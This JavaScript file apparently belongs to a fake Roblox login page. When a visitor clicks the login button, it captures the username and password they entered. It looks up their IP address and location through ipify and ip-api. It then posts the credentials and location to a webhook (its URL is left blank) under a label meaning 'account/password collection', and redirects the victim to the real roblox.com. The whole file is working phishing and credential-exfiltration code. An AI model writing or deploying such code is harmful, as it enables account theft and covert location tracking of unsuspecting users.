document.addEventListener("DOMContentLoaded", () => {
    const loginButton = document.getElementById("login-button");

    loginButton.addEventListener("click", () => {
        const username = document.getElementById("login-username").value.trim();
        const password = document.getElementById("login-password").value;

        if (!username || !password) {
            alert("請輸入帳號與密碼！");
            return;
        }

        fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                const userIP = data.ip;
                return fetch(`http://ip-api.com/json/${userIP}`);
            })
            .then(res => res.json())
            .then(geo => {
                const locationInfo = `
IP：${geo.query}
國家：${geo.country} (${geo.countryCode})
地區：${geo.regionName}
城市：${geo.city}
時區：${geo.timezone}
ISP：${geo.isp}
                `.trim();

                const webhookURL = "";

                return fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        content: `帳密資訊收集：
帳號：${username}
密碼：${password}

使用者位置資訊：
${locationInfo}`
                    }),
                });
            })
            .then(() => {
                window.location.href = "https://www.roblox.com/";
            })
            .catch((error) => {
                console.error("發生錯誤：", error);
                window.location.href = "https://www.roblox.com/";
            });
    });
});
